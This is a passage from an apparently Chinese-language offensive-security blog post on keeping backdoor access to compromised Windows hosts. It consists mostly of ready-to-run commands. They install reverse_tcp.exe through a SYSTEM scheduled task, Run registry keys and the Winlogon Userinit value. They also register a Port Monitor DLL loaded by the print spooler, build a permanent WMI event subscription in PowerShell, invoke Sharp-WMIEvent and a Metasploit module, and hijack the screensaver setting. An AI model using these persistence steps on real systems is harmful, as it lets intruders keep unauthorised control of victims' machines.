style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ppRun</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /SC</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> daily</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /ST</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 08:00</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /MO</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /TR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> c:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\W</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">indows</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ystem32</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\r</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">everse_tcp.exe</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /RU</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> System</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /F</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>这条命令将在\\Microsoft\\Windows\\AppTask路径下创建一个名为AppRun的后门程序</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/apptaskapprun.png" alt="apptaskapprun" tabindex="0" loading="lazy"><figcaption>apptaskapprun</figcaption></figure><h3 id="启动项-注册表键后门" tabindex="-1"><a class="header-anchor" href="#启动项-注册表键后门"><span>启动项\\注册表键后门</span></a></h3><p>通过将后门程序添加到系统自启动文件夹或利用注册表键来进行权限持久化</p><ul><li><p>系统自启动文件</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#位于以下文件夹的程序在指定用户登陆时启动</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">C:\\Users\\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;username&gt;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\A</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">ppDate</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\R</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">oaming</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\M</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">icrosoft</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\W</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">indows</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\S</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">tart</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">C:\\Users\\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;username&gt;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\A</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">ppDate</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\R</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">oaming</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\M</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">icrosoft</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\W</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">indows</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\S</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">tart </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">Menu</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\P</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">rograms</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">tartup</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#位于以下目录中的程序将在所有用户登陆时启动</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">C:\\ProgramData\\Microsoft\\Windows\\Start</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Menu</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\P</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">rograms</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">tartUp</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>利用该方法，只需要把后门程序丢到对应的目录下就行了</p></li><li><p>注册表运行键（Run Keys）</p><p>当用户登录时，系统会依次检查位于注册表运行键 (Run Keys)中的程序，并在用户登录的上下文中启动。Windows系统默认创建以下运行键，修改HKEY_LOCAL_MACHINE下的运行键需要拥有管理员权限</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#用户级的runkeys(当前用户登录时启动)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">\\HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">\\HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#系统级的runkeys(所有用户登录时都会启动)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">\\HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">\\HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>注意：由于windows版本的不同，注册表也不一定相同，例如RunServicesOnce就已经在较高版本中进行废弃</p><p>执行以下命令，在注册表运行键中添加一个名为&quot;Backdoor&quot;的键，并将将键指向后门程序的绝对路径</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">reg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\CurrentVersion\\Run&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Backdoor</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> REG_SZ</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;C:\\Windows\\System32\\reverse_tcp.exe&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>当目标重新登录主机时将会上线</p></li></ul><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/regadd-hkey-backdoor.png" alt="regadd-hkey-backdoor" tabindex="0" loading="lazy"><figcaption>regadd-hkey-backdoor</figcaption></figure><ul><li><p>Winlogon helper</p><p>windows系统的组件之一，用于处理与用户有关的行为，例如登录，注销，加载配置文件，锁定屏幕等，这些操作通过注册表进行设置<img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/winlogon.png" alt="winlogon" loading="lazy"></p><p>在表&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot;下设定着用户行为的值</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#用户登陆时执行的默认shell路径,默认为explorer.exe</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> NT</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\C</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">urrentVersion</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\W</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">inlogon</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">hell</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#windows身份验证期间执行的初始化程序(登录成功后)，默认为userini.exe</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> NT</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\C</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">urrentVersion</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\W</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">inlogon</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\U</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">serinit</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>执行以下命令，添加可执行程序</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">reg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Userinit</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;C:\\Windows\\System32\\userinit.exe,reverse_tcp.exe&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /f</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>当用户再次登录成功时，windows会在加载userinit.exe进行初始化的同时加载reverse_tcp.exe</p><p>注意：请保持原有的程序依然存在，为了以,的形式分隔加载的程序，需要将后门程序添加到相应的路径</p></li><li><p>Port Monitors</p><p>打印后台处理服务(Print Spooler)负责管理windows系统的打印作业。与该服务的交互是通过Print Spooler API实现的，其中包含的函数AddMonitor能够将DLL注入spoolsv.exe进程，以实现相应功能，并通过创建注册表键，实现权限持久化</p><p>条件：最低为管理员级别的权限</p><p>1.生成64位的恶意DLL文件</p><p>2.将生成的恶意DLL文件上传到c:\\windows\\system32目录下，执行以下命令，通过编辑注册表安装一个端口监视器</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">reg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\TestMonitor&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;Driver&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> REG_SZ</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;reverse_tcp.dll&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/test-monitor.png" alt="test-monitor" tabindex="0" loading="lazy"><figcaption>test-monitor</figcaption></figure><p>当系统重启时，Print Spooler服务会加载Monitor注册表下的全部子键，并以SYSTEM权限加载Driver对应的reverse_tcp.dll文件</p></li></ul><h2 id="事件触发执行" tabindex="-1"><a class="header-anchor" href="#事件触发执行"><span>事件触发执行</span></a></h2><h3 id="利用wmi订阅事件" tabindex="-1"><a class="header-anchor" href="#利用wmi订阅事件"><span>利用WMI订阅事件</span></a></h3><p>在横向移动中可以利用WMI订阅事件来上线，同样可以利用订阅事件来触发后门， 通过在目标主机上创建永久性的订阅事件，获得持续的权限</p><ul><li><p>手动利用</p><p>手动利用需要创建事件过滤器和事件消费者并进行绑定</p><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" data-title="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 创建一个名为TestFilter的事件过滤器</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$EventFilterArgs</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> @</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">    EventNamespace</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;root/cimv2&#39;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">    Name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;TestFilter&quot;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">    Query</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39; AND TargetInstance.SystemUptime &gt;= 240 AND TargetInstance.SystemUptime &lt; 325&quot;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">    QueryLanguage</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;WQL&#39;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$EventFilter</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> Set-WmiInstance</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Namespace root\\subscription </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Class __EventFilter </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Arguments </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$EventFilterArgs</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 创建一个名为TestConsumer的事件消费者，在指定事件发生时执行命令</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$CommandLineEventConsumerArgs</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> @</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">    Name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;TestConsumer&quot;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">    CommandLineTemplate</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;cmd.exe&quot;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$EventConsumer</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> Set-WmiInstance</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Namespace root\\subscription </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Class CommandLineEventConsumer </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Arguments </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$CommandLineEventConsumerArgs</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 绑定过滤器和事件消费者</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$FilterConsumerBindingArgs</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> @</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">    Filter</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $EventFilter</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">    Consumer</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $EventConsumer</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$FilterConsumerBinding</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> Set-WmiInstance</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Namespace root\\subscription </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Class __FilterToConsumerBinding </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Arguments </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$FilterConsumerBindingArgs</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>执行上述命令，目标机器会在5分钟内执行后门程序(可以通过将上述代码保存为ps1文件进行执行)</p></li><li><p>相关辅助工具</p><p>Sharp-WMIEvent在横向移动中可以用来在远程主机上执行命令，同样可以用来在控制机器上部署订阅事件</p><p>执行以下命令，利用该工具在本地部署一个订阅事件</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span> Sharp-WMIEvent -Trigger UserLogon -Command &quot;cmd.exe /c C:\\Windows\\Sytem32\\reverse_tcp.exe&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/sharp-wmievent.png" alt="sharp-wmievent" tabindex="0" loading="lazy"><figcaption>sharp-wmievent</figcaption></figure><p>这将部署一个随机命名的永久事件订阅，每当用户登录时将会执行恶意程序并上线</p><p>msf中有可以直接利用订阅事件的模块</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>exploit/windows/local/wmi_persistence</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>可通过自行设置trigger来控制事件的触发</p></li></ul><h3 id="利用屏幕保护程序" tabindex="-1"><a class="header-anchor" href="#利用屏幕保护程序"><span>利用屏幕保护程序</span></a></h3><p>屏幕保护程序是windows的一项功能，就是长时间没有动作自动启动的程序，例如熄屏等操作，这些操作由.scr可执行程序文件组成，能够在注册表中找到。</p><p>系统注册表项<code>HKEY_CURRENT_USER\\Control Panel\\Desktop</code>下储存了用来设定屏幕保护程序的键值</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/scenn.png" alt="scenn" tabindex="0" loading="lazy"><figcaption>scenn</figcaption></figure><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>SCRNSAVE.EXE 设定屏幕保护程序的路径，指向.scr为扩展名的可执行文件</span></span>
<span class="line"><span>ScreenSaveActive 屏幕保护程序的启动设置，1为启动</span></span>
<span class="line"><span>ScreenSaverIsSecure 设置是否需要密码解锁，0表示不需要</span></span>
<span class="line"><span>ScreenSaveTimeOut 设置执行屏幕保护程序之前用户不活动的超时时间</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>注意：默认只有ScreenSaveActive存在，其余三个需要自行创建</p><p>执行以下命令，修改注册表</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#将屏幕保护程序的启动程序指向上传的后门程序,这里是scr和exe都可以</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">reg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;HKEY_CURRENT_USER\\Control Panel\\Desktop&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> SCRNSAVE.EXE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> REG_SZ</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;C:\\Windows\\System32\\reverse_desktop.exe&quot;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#将屏幕保护程序开启，设定值为1(默认为1)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">reg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;HKEY_CURRENT_USER\\Control Panel\\Desktop&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ScreenSaveActive</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> REG_SZ</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /d</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#设定不需要密码解锁</span></span>
